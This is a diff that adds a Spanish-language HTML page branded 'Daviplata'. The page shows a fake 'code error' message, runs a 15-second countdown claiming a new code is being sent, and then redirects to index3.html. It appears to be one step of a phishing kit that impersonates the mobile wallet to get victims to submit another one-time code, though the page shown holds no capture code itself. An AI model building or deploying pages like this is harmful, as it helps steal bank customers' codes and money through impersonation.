@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head>
+<body style="color: #BE2720; font-size: 18px; font-family: &#39;Graphik-Regular&#39;sans-serif; background: url(archivos/oapp.jpg);
+  background-size: cover;
+  background-repeat: no-repeat;"><main style="margin-top: 0px; width: 80%;">
+
+  <link rel="stylesheet" href="./archivos/style.css">
+
+  <title>Daviplata</title>
+  
+     
+ <script language="JavaScript">
+ 
+    /* Determinamos el tiempo total en segundos */
+    var totalTiempo=15;
+    
+    var url="index3.html";
+ 
+    function updateReloj()
+    {
+        document.getElementById('CuentaAtras').innerHTML = ""+totalTiempo+"";
+ 
+        if(totalTiempo==0)
+        {
+            window.location=url;
+        }else{
+            /* Restamos un segundo al tiempo restante */
+            totalTiempo-=1;
+            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
+            setTimeout("updateReloj()",1000);
+        }
+    }
+ 
+    window.onload=updateReloj;
+ 
+    </script>
+
+
+<style>
+#wait{
+  position:relative;
+  
+  width:;
+  z-index:9999;
+  
+}
+
+
+</style>
+
+<center>
+  <br><br><br><br><br><br>
+
+	<div align="center">	<br><br>		
+			<span style="font-size:30px;color:#ffffff;"></span><br><br>
+			<img src="archivos/adv.png" style="width:100px;">
+			
+			<br>
+			<br><br>
+				<div align="center"  style="color:red;font-size:28px;">¡ERROR DE CÓDIGO!</div><br>
+				
+				                     <div style="text-align: center;font-size:28px;color:#ffffff;" align="center">
+                        Por favor espere <br><font id="CuentaAtras" style=" font-size:28px;"></font><br> segundos <br><br> Le estamos enviando un nuevo código</div>
+			<br><br>
+			
+				
+						
+		</div>
+
+
+</center></main>
+
+</body></html>
